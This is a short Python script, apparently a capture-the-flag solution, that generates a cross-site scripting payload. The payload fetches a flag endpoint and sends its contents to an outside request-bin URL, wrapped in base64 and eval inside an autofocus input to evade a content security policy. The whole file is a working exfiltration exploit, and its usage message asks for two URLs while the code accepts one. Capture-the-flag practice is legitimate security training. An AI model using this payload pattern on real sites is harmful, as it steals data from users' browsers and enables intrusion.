import sys
import base64

if len(sys.argv) != 2:
    print("Please specify challenge URL and Request bin URL")
    print("python solution.py http://endiel6lj35l8.x.pipedream.net")
else:  
	vector = "var xhr = new XMLHttpRequest(); xhr.open('GET','/csp-one-flag'"
	vector = vector + ", true); xhr.onload = function () { var request = new XMLHttpRequest(); request.open('GET', '"
	vector = vector + sys.argv[1] + "?flag='+xhr.responseText, true);request.send()};xhr.send(null);"
	print("before encoding:\n")
	print(vector)
	print("\nafter encoding:\n")
	encoded = '<input onfocus=\'eval(atob("'
	encoded = encoded + base64.b64encode(vector)
	encoded = encoded + '"))\' autofocus></input>'
	print(encoded)
